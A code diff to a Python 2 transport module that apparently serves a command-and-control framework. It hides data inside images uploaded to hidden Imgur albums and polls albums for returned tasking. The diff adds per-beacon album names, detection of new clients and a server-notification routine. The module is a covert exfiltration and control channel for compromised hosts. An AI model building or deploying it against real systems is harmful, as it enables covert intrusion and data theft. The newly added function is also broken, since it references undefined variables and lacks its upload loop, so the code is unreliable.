@@ -23,7 +23,7 @@ SEND_ALBUM_NAME = ```[var:::send_album_name]```
 RECV_ALBUM_NAME = ```[var:::recv_album_name]```
 access_token = ```[var:::access_token]```
 refresh_token = ```[var:::refresh_token]```
-
+INIT_ALBUM_NAME = ```[var:::init_album_name]```
 # 
 STAGER_ALBUM_NAME = ```[var:::stager_album_name]```
 # </END OF GHETTO CONFIG SECTION>
@@ -210,14 +210,14 @@ def prepTransport():
 	return 0
 
 
-def sendData(data):
+def sendData(beacon_id, data):
 	# Transport will receiving a list of images
 	# Application will have already encoded the data
 	# Logic will probably be different for client,
 	# indicating that we're going to run into issues
 	# Here, we're expecting to recieve a list of PIL images from the encoder
 	fields = {}
-	fields = { 'title': SEND_ALBUM_NAME, 'privacy': "hidden"}
+	fields = { 'title': (str(beacon_id) + ":" + SEND_ALBUM_NAME), 'privacy': "hidden"}
 	album_object = client.create_album(fields)
 	fields.update({"id": album_object['id']})
 
@@ -253,13 +253,13 @@ def sendData(data):
 			time.sleep(300)
 
 
-def retrieveData():
+def retrieveData(beacon_id):
 	# Check for new albums
 	while True:
 		try:
 			account_albums = client.get_account_albums(USERNAME)
 			account_albums[0]
-			if account_albums[0].title == RECV_ALBUM_NAME:
+			if account_albums[0].title == (str(beacon_id) + ":" + RECV_ALBUM_NAME):
 				break
 			else:
 				print "No new albums yet, sleeping for 2m"
@@ -290,3 +290,48 @@ def retrieveData():
 	# Now lets unbase64 and decompress this data
 	raw_data = zlib.decompress(base64.b64decode(reconstructed_data))
 	return raw_data
+
+def check_for_new_clients():
+	while True:
+		try:
+			account_albums = client.get_account_albums(USERNAME)
+			account_albums[0]
+			if account_albums[0].title == INIT_ALBUM_NAME:
+				break
+			else:
+				return None
+		except IndexError:
+			return None
+
+
+
+def send_server_notification(notification_data_frame):
+	fields = {}
+	fields = {'title': (INIT_ALBUM_NAME), 'privacy': "hidden"}
+	album_object = client.create_album(fields)
+	fields.update({"id": album_object['id']})
+
+	data = base64.b64encode(zlib.compress(data, 9))
+	data_list = [data[i:i+4319] for i in range(0, len(data), 4319)]
+
+	photo_id = 1
+	image_upload_fields = {'type': 'base64', 'album': album_object['id']}
+
+	credits = checkStatus(silent=False)
+	# TODO: Add logic to safely check if we can upload photos here
+	# if credits['UserRemaining'] < len(data_list) or credits['ClientRemaining'] < len(data_list):
+
+	print "Uploading %d images" % (len(data_list))
+
+	photo = encoder.encode(chunk, photo_id=photo_id)
+	image_upload_fields.update({'image': base64.b64encode(photo.getvalue())})
+	while True:
+		try:
+			request = client.make_request('POST', 'upload', image_upload_fields)
+		except helpers.error.ImgurClientRateLimitError:
+			print "Hit the rate limit, sleeping for 10m"
+			time.sleep(600)
+			continue
+		break
+	del photo
+	credits = checkStatus(silent=False)
